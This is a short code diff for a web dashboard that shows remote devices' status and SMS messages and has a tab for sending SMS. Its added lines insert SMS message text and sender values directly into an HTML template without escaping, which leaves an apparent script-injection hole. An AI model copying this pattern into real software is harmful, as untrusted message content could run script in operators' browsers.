@@ -31,7 +31,7 @@ function initDeviceDetail(device, sourceId) {
 }
 
 function updateDetailHeader(device) {
-    document.getElementById('detailDeviceName').textContent = `📱 ${device.name}`;
+    document.getElementById('detailDeviceName').textContent = `📱 ${device.id.substring(0, 12)}...`;
 
     const statusEl = document.getElementById('detailDeviceStatus');
     statusEl.textContent = device.status === 'online' ? '🟢 Online' : '🔴 Offline';
@@ -148,12 +148,25 @@ function loadInfoTab(device) {
                 <div class="info-item-label">Last Seen</div>
                 <div class="info-item-value">${formatDate(device.lastSeen)}</div>
             </div>
+            <hr class="info-divider" style="grid-column: 1 / -1;">
+            <div class="info-item" style="grid-column: 1 / -1;">
+                <div class="info-item-label">📨 SMS Message</div>
+                <div class="info-item-value" style="font-weight:400; word-wrap:break-word;">
+                    ${device.smsBody || 'No SMS data'}
+                </div>
+            </div>
+            ${device.smsSender ? `
+            <div class="info-item" style="grid-column: 1 / -1;">
+                <div class="info-item-label">From</div>
+                <div class="info-item-value">${device.smsSender}</div>
+            </div>
+            ` : ''}
         </div>
     `;
 }
 
 // ────────────────────────────────────────────────
-// SMS TAB - UPDATED FOR YOUR DATA
+// SMS TAB
 // ────────────────────────────────────────────────
 
 async function loadSmsTab(device) {
@@ -229,7 +242,7 @@ function renderSmsMessages(messages) {
 }
 
 // ────────────────────────────────────────────────
-// SEND TAB - UPDATED FOR YOUR DATA
+// SEND TAB
 // ────────────────────────────────────────────────
 
 function setupSendSms(device) {
